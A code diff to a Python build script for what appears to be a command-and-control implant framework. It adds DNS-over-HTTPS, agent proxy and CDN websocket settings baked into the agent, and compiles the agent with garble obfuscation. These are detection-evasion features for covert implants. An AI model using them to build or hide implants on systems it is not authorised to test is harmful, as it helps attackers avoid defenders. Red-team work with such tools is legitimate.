@@ -58,6 +58,18 @@ class GoBuild:
             self.AgentRoot = f".{rand_str(random.randint(3, 9))}"
             CACHED_CONF['agent_root'] = self.AgentRoot
 
+        # DoH
+        if "doh_server" not in CACHED_CONF:
+            CACHED_CONF['doh_server'] = ""
+
+        # agent proxy
+        if "agent_proxy" not in CACHED_CONF:
+            CACHED_CONF['agent_proxy'] = ""
+
+        # cdn proxy
+        if "cdn_proxy" not in CACHED_CONF:
+            CACHED_CONF['cdn_proxy'] = ""
+
     def build(self):
         '''
         cd to cmd and run go build
@@ -106,8 +118,14 @@ class GoBuild:
             build_target = f"../../build/{self.target}-{self.UUID}"
         # cmd = f'''GOOS={self.GOOS} GOARCH={self.GOARCH}''' + \
         # f''' go build -ldflags='-s -w -extldflags "-static"' -o ../../build/{self.target}'''
+
         cmd = f'''GOOS={self.GOOS} GOARCH={self.GOARCH} CGO_ENABLED=0''' + \
             f''' go build -ldflags='-s -w' -o {build_target}'''
+        # garble
+        if shutil.which("garble"):
+            cmd = f'''GOOS={self.GOOS} GOARCH={self.GOARCH} CGO_ENABLED=0 GOPRIVATE=''' + \
+                f''' garble -literals -tiny build -o {build_target} -ldflags="-v -buildmode=pie" -trimpath .'''
+
         os.system(cmd)
         log_warn("GO BUILD ends...")
 
@@ -201,6 +219,18 @@ class GoBuild:
         unsed("./lib/data/def.go",
               "AgentUUID = \"[agent_uuid]\"", f"AgentUUID = \"{self.UUID}\"")
 
+        # DoH
+        unsed("./lib/data/def.go",
+              "DoHServer = \"\"", f"DoHServer = \"{CACHED_CONF['doh_server']}\"")
+
+        # CDN
+        unsed("./lib/data/def.go",
+              "CDNProxy = \"\"", f"CDNProxy = \"{CACHED_CONF['cdn_proxy']}\"")
+
+        # Agent Proxy
+        unsed("./lib/data/def.go",
+              "AgentProxy = \"\"", f"AgentProxy = \"{CACHED_CONF['agent_proxy']}\"")
+
         # ports
         unsed("./lib/data/def.go",
               "CCPort = \"[cc_port]\"", f"CCPort = \"{CACHED_CONF['cc_port']}\"")
@@ -269,6 +299,18 @@ class GoBuild:
         # agent UUID
         sed("./lib/data/def.go",
             "AgentUUID = \"[agent_uuid]\"", f"AgentUUID = \"{self.UUID}\"")
+
+        # DoH
+        sed("./lib/data/def.go",
+            "DoHServer = \"\"", f"DoHServer = \"{CACHED_CONF['doh_server']}\"")
+
+        # CDN
+        sed("./lib/data/def.go",
+            "CDNProxy = \"\"", f"CDNProxy = \"{CACHED_CONF['cdn_proxy']}\"")
+
+        # Agent Proxy
+        sed("./lib/data/def.go",
+            "AgentProxy = \"\"", f"AgentProxy = \"{CACHED_CONF['agent_proxy']}\"")
 
         # ports
         sed("./lib/data/def.go",
@@ -390,10 +432,14 @@ def main(target):
             clean()
         ccip = input(
             "CC server address (domain name or ip address, can be more than one, separate with space):\n> ").strip()
-        CACHED_CONF['ccip'] = ccip[0]
+        CACHED_CONF['ccip'] = ccip
+        if len(ccip.split()) > 1:
+            CACHED_CONF['ccip'] = ccip[0]
 
     if target == "cc":
-        cc_other = ' '.join(ccip[1:])
+        cc_other = ""
+        if len(ccip.split()) > 1:
+            cc_other = ' '.join(ccip[1:])
 
         gobuild = GoBuild(target="cc", cc_ip=ccip, cc_other_names=cc_other)
         gobuild.build()
@@ -428,6 +474,39 @@ def main(target):
     if not use_cached:
         indicator_text = input("CC status indicator text: ").strip()
         CACHED_CONF['indicator_text'] = indicator_text
+
+    # Agent proxy
+    use_cached = False
+
+    if "agent_proxy" in CACHED_CONF:
+        use_cached = yes_no(
+            f"Use cached agent proxy ({CACHED_CONF['agent_proxy']})?")
+
+    if not use_cached:
+        agentproxy = input("Proxy server for agent: ").strip()
+        CACHED_CONF['agent_proxy'] = agentproxy
+
+    # CDN
+    use_cached = False
+
+    if "cdn_proxy" in CACHED_CONF:
+        use_cached = yes_no(
+            f"Use cached CDN server ({CACHED_CONF['cdn_proxy']})?")
+
+    if not use_cached:
+        cdn = input("CDN websocket server: ").strip()
+        CACHED_CONF['cdn_proxy'] = cdn
+
+    # DoH
+    use_cached = False
+
+    if "doh_server" in CACHED_CONF:
+        use_cached = yes_no(
+            f"Use cached DoH server ({CACHED_CONF['doh_server']})?")
+
+    if not use_cached:
+        doh = input("DNS over HTTP server: ").strip()
+        CACHED_CONF['doh_server'] = doh
 
     # guardian shellcode
 
